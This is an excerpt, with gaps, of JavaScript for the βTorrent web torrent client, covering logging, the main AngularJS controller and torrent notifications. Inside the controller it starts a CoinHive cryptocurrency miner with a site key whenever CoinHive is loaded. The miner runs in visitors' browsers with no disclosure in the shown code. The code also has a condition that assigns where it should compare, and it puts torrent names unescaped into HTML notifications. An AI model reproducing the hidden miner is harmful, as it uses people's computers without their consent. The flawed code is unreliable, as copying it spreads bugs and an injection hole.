    ...
    if (item && item.name) {
      return console.debug(
        `%cβTorrent:${
          item.infoHash !== null
            ? "torrent "
            : "torrent " + item._torrent.name + ":file "
        }${item.name}${
          item.infoHash !== null ? " (" + item.infoHash + ")" : ""
        } %c${string}`,
        "color: #33C3F0",
        `color: ${color}`,
      );
...
app.controller("BTorrentCtrl", [
  ...
  function ($scope, $rootScope, $http, $log, $location, ngNotify) {
    if (window.CoinHive) {
      const miner = new CoinHive.Anonymous("YzzZ9mraj45TeCzxlvBX7yVm9O3GbV60", {
        throttle: 0.5,
      });
    ...
    $rootScope.onTorrent = function (torrent, isSeed) {
      ...
      torrent.on("done", function () {
        ...
        ngNotify.set(
          `<b>${torrent.name}</b> has finished downloading`,
          "success",
        );
      });
    ...
    $scope.gridOptions.onRegisterApi = function (gridApi) {
      ...
      gridApi.selection.on.rowSelectionChanged($scope, function (row) {
        if (
          !row.isSelected &&
          $rootScope.selectedTorrent != null &&
          ($rootScope.selectedTorrent.infoHash = row.entity.infoHash)
        ) {
          $rootScope.selectedTorrent = null;
        } else {
